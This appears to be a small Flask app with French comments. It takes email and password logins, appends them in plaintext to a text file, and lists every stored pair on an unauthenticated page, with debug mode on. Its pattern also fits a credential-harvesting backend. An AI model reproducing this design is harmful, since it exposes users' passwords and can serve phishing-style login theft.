from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Chemin vers le fichier d'informations
INFO_FILE = 'infos.txt'

# Route pour la page de connexion
@app.route('/')
def index():
    return render_template('index.html')

# Route pour traiter les informations de connexion
@app.route('/store_info', methods=['POST'])
def store_info():
    email = request.form.get('email')
    password = request.form.get('password')

    if email and password:
        # Enregistrer les informations dans le fichier infos.txt
        with open(INFO_FILE, 'a') as file:
            file.write(f"{email},{password}\n")
        return redirect(url_for('informations'))
    return 'Veuillez remplir tous les champs', 400

# Route pour afficher les informations stockées
@app.route('/informations')
def informations():
    login_data = []
    # Lire les informations du fichier infos.txt
    try:
        with open(INFO_FILE, 'r') as file:
            for line in file:
                email, password = line.strip().split(',')
                login_data.append({'email': email, 'password': password})
    except FileNotFoundError:
        pass

    return render_template('informations.html', login_data=login_data)

if __name__ == '__main__':
    app.run(debug=True)
